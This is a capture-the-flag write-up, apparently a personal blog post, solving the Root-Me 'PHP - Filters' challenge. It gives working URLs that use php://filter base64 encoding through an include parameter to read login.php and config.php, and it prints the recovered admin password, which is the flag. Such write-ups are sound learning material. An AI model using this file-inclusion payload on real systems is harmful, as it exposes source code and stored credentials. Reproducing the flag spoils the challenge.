---
title: PHP - Filters
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation]
---

* Points: 25
* Link: [https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

## Statement

> Retrieve the administrator password of this application.

## Solution

Click to login button, and look at the url
```
http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php
```

So ```$inc = $_GET['inc]``` will query to a page. I guess [```file_get_contents($inc)```](https://www.php.net/manual/en/function.file-get-contents.php) or [```include($inc)```](https://www.php.net/manual/en/function.include.php) function must have been used.

Try [PHP Conversion Filters](https://www.php.net/manual/en/filters.convert.php) to get page's PHP code

```
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php
```

It works!

We got a PHP code encoded by [base64](https://www.base64encoder.io/learn/). Decode it and there is it, PHP code
```php
<?php
include("config.php");

if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>

<form action="" method="post">
  Login&nbsp;<br/>
  <input type="text" name="username" /><br/><br/>
  Password&nbsp;<br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>

<?php } ?>
```

The challenge said
```php
print("To validate the challenge use this password<br/><br/>");
```

So we need to find password.

There is another file, ```config.php```. ```password``` may be in that file. Now we will read it

```
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
```

```php
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```

The flag is
```
DAPt9D2mky0APAF
```